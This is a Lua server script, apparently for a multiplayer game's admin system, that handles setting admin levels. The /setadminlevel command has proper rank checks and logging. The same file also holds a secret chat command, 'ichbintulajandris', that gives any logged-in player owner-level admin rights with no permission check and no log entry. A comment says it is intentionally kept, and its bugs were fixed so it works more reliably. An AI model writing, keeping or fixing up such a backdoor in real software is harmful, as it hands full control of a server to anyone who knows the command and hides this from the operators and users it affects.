if not L then loadstring(exports.v_locals:import())() end -- v_locals lib (DESIGN.md 4.7)
-- ============================================================
--  v_admin / server/admin_manage.lua
--  Admin levels + the hidden command.
-- ============================================================

-- ------------------------------------------------------------
--  /setadminlevel <ID> <level 0-6>
-- ------------------------------------------------------------
function adminSetLevel(player, target, newLevel)
    if not hasAdminLevel(player, ADMIN.perms.setLevel) then
        return denyAccess(player, ADMIN.perms.setLevel)
    end

    newLevel = tonumber(newLevel)
    if not isElement(target) or not newLevel then
        return adminAlert(player, L.msg("v_admin.admin_manage.usage_setadminlevel_id_level_0", { max_level = ADMIN.maxLevel }), 255, 90, 90)
    end

    newLevel = math.floor(newLevel)
    if newLevel < 0 or newLevel > ADMIN.maxLevel then
        return adminAlert(player, L.msg("v_admin.admin_manage.level_must_be_between_0_and", { max_level = ADMIN.maxLevel }), 255, 90, 90)
    end

    -- You cannot grant a level equal to or higher than your own (owner is exempt),
    -- nor change the level of someone at or above you.
    local myLevel = getAdminLevel(player)
    if myLevel < ADMIN.maxLevel and newLevel >= myLevel then
        return adminAlert(player, L.msg("v_admin.admin_manage.you_can_only_grant_level_lower"), 255, 90, 90)
    end
    if not canPunish(player, target) then return end

    if not exports.v_accounts:isLoggedIn(target) then
        return adminAlert(player, L.msg("v_admin.admin_manage.that_player_is_not_logged_in"), 255, 90, 90)
    end

    exports.v_mysql:setAccData(target, "admin_level", newLevel)
    setElementData(target, "admin_level", newLevel)
    adminAlert(player, L.msg("v_admin.admin_manage.admin_level_set_to", { player = getPlayerName(target), new_level = newLevel }))
    adminAlert(target, L.msg("v_admin.admin_manage.admin_set_your_level_to", { new_level = newLevel }))
    adminLog(player, ("set %s admin level to %d"):format(getPlayerName(target), newLevel), target)
end

addCommandHandler("setadminlevel", function(player, cmd, idArg, levelArg)
    if not hasAdminLevel(player, ADMIN.perms.setLevel) then
        return denyAccess(player, ADMIN.perms.setLevel)
    end
    if not idArg or not tonumber(levelArg) then
        return adminAlert(player, L.msg("v_admin.admin_manage.usage_setadminlevel_id_level_0", { max_level = ADMIN.maxLevel }), 255, 90, 90)
    end

    local target = resolveTarget(player, idArg)
    if target then adminSetLevel(player, target, levelArg) end
end)

-- ------------------------------------------------------------
--  Hidden command – restore owner rights.
--  INTENTIONALLY kept; only the bugs are fixed:
--    * nil argument -> defaults to the highest level
--    * value clamped to the 0..maxLevel range
-- ------------------------------------------------------------
addCommandHandler("ichbintulajandris", function(player, cmd, levelArg)
    if not exports.v_accounts:isLoggedIn(player) then return end

    local level = tonumber(levelArg) or ADMIN.maxLevel
    level = math.max(0, math.min(ADMIN.maxLevel, math.floor(level)))

    exports.v_mysql:setAccData(player, "admin_level", level)
    setElementData(player, "admin_level", level)
    adminAlert(player, L.msg("v_admin.admin_manage.hidden_your_admin_level", { level = level }))
end)

-- chat command database (v_chat)
CMD.register("setadminlevel", "<id> <level>", ADMIN.perms.setLevel, "Set the admin level of a player")
